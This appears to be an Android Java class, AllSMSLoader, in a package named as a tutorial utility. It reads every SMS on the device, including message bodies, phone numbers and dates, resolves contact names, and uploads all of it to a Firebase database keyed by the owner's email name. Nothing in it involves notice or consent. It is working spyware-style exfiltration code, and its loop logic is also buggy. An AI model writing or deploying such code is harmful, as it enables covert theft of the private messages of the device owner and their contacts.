package com.android.tutorial.utils;

import android.app.LoaderManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.CursorLoader;
import android.content.Loader;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

/**
 * Created by Mannan on 11/24/2017.
 */

public class AllSMSLoader implements LoaderManager.LoaderCallbacks<Cursor> {
    private Context context;

    public AllSMSLoader(Context context) {
        this.context = context;
    }

    @Override
    public Loader<Cursor> onCreateLoader(int i, Bundle bundle) {
        final String SMS_ALL = "content://sms/";
        Uri uri = Uri.parse(SMS_ALL);
        String[] projection = new String[]{"_id", "thread_id", "address", "person", "body", "date", "type"};
        return new CursorLoader(context, uri, projection, null, null, "date desc");
    }

    @Override
    public void onLoadFinished(Loader<Cursor> cursorLoader, Cursor cursor) {
        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
        Log.v("", "LoadFinished");
        List<SMS> sms_All = new ArrayList<SMS>();
        List<String> phoneNumbers = new ArrayList<String>();
        int totalSMS = cursor.getCount();
        String readStatus = "";
        while (cursor.moveToNext()) {
            for (int i = 0; i < totalSMS; i++) {
                String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                Log.v("", phoneNumber);
                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                if ((!phoneNumbers.contains(phoneNumber)) && (type != 3) && (phoneNumber.length() >= 1)) {
                    String name = null;
                    String person = cursor.getString(cursor.getColumnIndexOrThrow("person"));
                    String smsContent = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    Date date = new Date(Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date"))));
                    Uri personUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, phoneNumber);
                    ContentResolver cr = context.getContentResolver();
                    Cursor localCursor = cr.query(personUri,
                            new String[]{ContactsContract.Contacts.DISPLAY_NAME},
                            null, null, null);//use phonenumber find contact name
                    if (localCursor.getCount() != 0) {
                        localCursor.moveToFirst();
                        name = localCursor.getString(localCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    }
                    Log.v("", "person:" + person + "  name:" + name + "  phoneNumber:" + phoneNumber);
                    if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                        readStatus = "inbox";
                    } else {
                        readStatus = "sent";
                    }
                    localCursor.close();
                    phoneNumbers.add(phoneNumber);
                    SMS sms = new SMS("" + name, "" + phoneNumber,
                            "" + smsContent, "" + type, "" + date);
                    mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(context)
//                                MyDevice.getDeviceName()
                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
                            .child(phoneNumber)
                            .child(readStatus)
                            .child("" + i)
                            .setValue("(" + "person:" + person + "  name:" + name + ")" +
                                    "" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                                    + " " + smsContent
                            );
                    sms_All.add(sms);
                }
            }
        }
        //simpleCursorAdapter.swapCursor(cursor);
    }

    @Override
    public void onLoaderReset(Loader<Cursor> cursorLoader) {
        //simpleCursorAdapter.swapCursor(null);
    }

    private class SMS {
        String name;
        String phoneNumber;
        String smsContent;
        String type;
        String date;

        public SMS(String name, String phoneNumber, String smsContent, String type, String date) {
            this.name = name;
            this.phoneNumber = phoneNumber;
            this.smsContent = smsContent;
            this.type = type;
            this.date = date;
        }
    }
}
